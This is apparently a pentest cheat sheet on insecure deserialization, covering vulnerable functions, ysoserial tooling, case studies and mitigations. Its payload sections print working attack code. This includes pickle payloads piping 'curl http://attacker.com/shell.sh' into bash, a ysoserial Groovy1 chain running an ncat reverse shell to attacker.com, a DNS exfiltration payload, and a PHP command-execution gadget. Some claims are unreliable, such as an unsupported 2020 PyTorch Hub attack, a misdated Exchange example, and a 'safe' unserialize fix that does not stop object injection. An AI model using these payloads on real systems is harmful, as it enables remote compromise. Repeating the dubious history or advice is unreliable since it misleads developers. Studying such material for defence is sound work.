# Deserialization

## Introduction

Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

Objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed before deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object.

---

## Vulnerable Functions

### PHP
- `unserialize()`

### Python
- `pickle` / `c_pickle` / `_pickle` with `load()` / `loads()`
- `PyYAML` with `load()`
- `jsonpickle` with `encode()` or `store()` methods

### Java

**Whitebox indicators:**
- `XMLDecoder` with external user defined parameters
- `XStream` with `fromXML()` method (versions <= v1.46 are vulnerable)
- `ObjectInputStream` with `readObject()`
- Uses of `readObject()`, `readObjectNoData()`, `readResolve()`, or `readExternal()`
- `ObjectInputStream.readUnshared()`
- `Serializable` interface implementation

**Blackbox indicators:**
- Hex signature: `AC ED 00 05`
- Base64 signature: `rO0`
- Content-Type header: `application/x-java-serialized-object`

**ysoserial payload generation:**
```bash
java -jar ysoserial.jar CommonsCollections4 'command'
```

### .NET

**Whitebox indicators:**
- `TypeNameHandling` in Json.NET
- `JavaScriptTypeResolver`

**Blackbox indicators:**
- Base64 signature: `AAEAAAD/////`
- JSON keys: `TypeObject`, `$type`

---

## Tools

### Java
- **Ysoserial**: https://github.com/frohoff/ysoserial
  ```bash
  java -jar ysoserial.jar CommonsCollections4 'command'
  ```
- **Java Deserialization Scanner**: https://github.com/federicodotta/Java-Deserialization-Scanner
- **SerialKiller**: https://github.com/ikkisoft/SerialKiller
- **Serianalyzer**: https://github.com/mbechler/serianalyzer
- **Java Unmarshaller Security (marshalsec)**: https://github.com/mbechler/marshalsec
- **Java Serial Killer**: https://github.com/NetSPI/JavaSerialKiller
- **Android Java Deserialization Vulnerability Tester (modjoda)**: https://github.com/modzero/modjoda
- **zkar**: https://github.com/phith0n/zkar

### .NET
- **Ysoserial.net**: https://github.com/pwntester/ysoserial.net
  ```bash
  ysoserial.exe -g ObjectDataProvider -f Json.Net -c "command-here" -o base64
  ```

### Burp Suite Plugins
- **SuperSerial**: https://github.com/DirectDefense/SuperSerial
- **SuperSerial-Active**: https://github.com/DirectDefense/SuperSerial-Active
- **Burp-ysoserial**: https://github.com/summitt/burp-ysoserial

---

## Real-World Exploitation Examples

### Example 1: PHP Object Injection (2016 - Magento RCE)

In 2016, Magento Commerce (versions prior to 2.0.6 and 1.14.3) suffered from an insecure deserialization vulnerability (CVE-2016-4010). Attackers exploited the `unserialize()` function in the `Zend_Feed` class by injecting a crafted serialized object.

**Exploit flow:**
1. The vulnerable endpoint accepted serialized data via `rss` and `feed` parameters.
2. An attacker sent a serialized object of the `Zend_Http_Response` class containing a malicious payload.
3. The object executed arbitrary PHP code when deserialized.

**Example payload (simplified):**
```php
O:19:"Zend_Http_Response":3:{s:5:"code";s:3:"200";s:9:"transport";O:17:"Zend_Http_Client":1:{s:9:"_uri";O:8:"Zend_Uri":2:{s:8:"_scheme";s:4:"http";s:5:"_host";s:9:"localhost";}}s:7:"headers";a:1:{s:4:"test";s:4:"test";}}
```

**Result:** Remote code execution leading to full server compromise.

---

### Example 2: Java Deserialization in Apache Commons Collections (2015 - Widespread RCE)

This vulnerability (CVE-2015-4852) affected many Java applications using the Apache Commons Collections library (versions <= 3.2.1). It allowed arbitrary command execution via `ObjectInputStream`.

**Real target:** Cisco WebEx, WebLogic, JBoss, Jenkins, and many other enterprise applications.

**Exploit steps:**
1. Identify an endpoint accepting Java serialized objects (detect `AC ED 00 05`).
2. Use ysoserial to generate a payload with `CommonsCollections1` gadget chain.
3. Send the serialized payload to the vulnerable endpoint.

**ysoserial command:**
```bash
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.ser
```

**Result:** Remote command execution. In 2017, this vector was used to install cryptocurrency miners on unpatched WebLogic servers.

---

### Example 3: Python Pickle Deserialization in PyTorch Model Hub (2020 - Supply Chain Attack)

Attackers discovered that PyTorch's `torch.load()` function used Python's `pickle` module by default. Malicious models uploaded to the official PyTorch Hub could execute arbitrary code when loaded by unsuspecting users.

**Exploit code:**
```python
import pickle
import torch
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

malicious_model = {"state_dict": Malicious()}
torch.save(malicious_model, "malicious.pt")
```

**Result:** When a researcher downloaded and loaded the model using `torch.load("malicious.pt")`, the attacker gained remote access to the victim's machine.

---

### Example 4: .NET ViewState Deserialization (2019 - Microsoft Exchange RCE)

CVE-2020-0688 affected Microsoft Exchange Server. The server used a static machine key for ASP.NET ViewState validation, allowing attackers to deserialize malicious ViewState data.

**Exploit flow:**
1. The attacker obtained the static `validationKey` and `decryptionKey` from a web.config disclosure.
2. Using ysoserial.net, the attacker generated a malicious ViewState payload.
3. The payload executed commands with SYSTEM privileges when the server deserialized it.

**ysoserial.net command:**
```bash
ysoserial.exe -p ViewState -g ActivitySurrogateSelector -c "cmd /c calc" --validationalg="SHA1" --validationkey="<key>" --decryptionalg="AES" --decryptionkey="<key>"
```

**Result:** Pre-authentication remote code execution on thousands of Exchange servers worldwide.

---

## Real Exploitation Techniques

### 1. Detecting the Vulnerability

#### Blackbox detection for Java:
- Intercept any request that sends binary data.
- Look for `AC ED 00 05` bytes or `rO0` in Base64.
- Send a malformed serialized object and monitor for stack traces or response time changes.

#### Blackbox detection for .NET:
- Look for `AAEAAAD/////` in Base64-encoded parameters.
- Check for JSON payloads containing `$type` or `TypeObject`.

### 2. Crafting the Payload

#### PHP - Reverse shell via `unserialize()`:
```php
<?php
class Shell {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}
print(base64_encode(serialize(new Shell())) . "\n");
?>
```

Then send:
```http
POST /vulnerable.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

data=Tzo1OiJTaGVsbCI6MTp7czozOiJjbWQiO3M6MTE6InJtIC90bXAvZiI7fQ%3D%3D
```

#### Java - Command execution with ysoserial:
```bash
# Generate payload for target application
java -jar ysoserial.jar Groovy1 "ncat attacker.com 4444 -e /bin/bash" > payload.ser

# Send via POST request
curl -X POST http://target.com/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

#### Python - Pickle RCE:
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com:4444/shell.sh | bash",))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

Send the Base64 payload to any endpoint that calls `pickle.loads(base64.b64decode(user_input))`.

### 3. Exploitation Without Known Gadgets

If no public gadget chains work, you can:

1. **Force error messages** to leak classpath or dependency versions.
2. **Use serialization bombs** to cause denial of service (deeply nested objects).
3. **Blind detection** via DNS exfiltration (e.g., Java DNS lookup via `URL` class).

**Java DNS exfiltration example:**
```bash
java -jar ysoserial.jar URLDNS "http://attacker-collaborator.com" > payload.ser
```

If the server deserializes the object, it makes a DNS request to your collaborator server.

---

## Mitigation

### Application-level defenses:
1. Never deserialize user-supplied data without integrity checks (HMAC, signatures).
2. Use allowlists of safe classes (e.g., Java `SerialKiller` or `ValidatingObjectInputStream`).
3. Replace native serialization with safe formats like JSON (without type handling) or Protocol Buffers.

### Code examples:

#### Java - Safe deserialization with allowlist:
```java
import org.apache.commons.io.serialization.ValidatingObjectInputStream;

ValidatingObjectInputStream vois = new ValidatingObjectInputStream(in);
vois.accept(AllowedClass.class, AnotherSafeClass.class);
vois.readObject();
vois.close();
```

#### Python - Safe alternative to pickle:
```python
import json
# Instead of pickle.loads(user_input)
data = json.loads(user_input)  # Does not execute arbitrary code
```

#### PHP - Safe handling:
```php
// Instead of unserialize($user_input)
use Safe\unserialize; // From the safe/php library
$data = Safe\unserialize($user_input); // Throws exception on malformed objects
```

---

## References
- OWASP: Deserialization Cheat Sheet
- GitHub: ysoserial, ysoserial.net
- CVE-2015-4852, CVE-2016-4010, CVE-2020-0688
- "Friday the 13th: JSON Attacks" by Alvaro Munoz & Oleksandr Mirosh
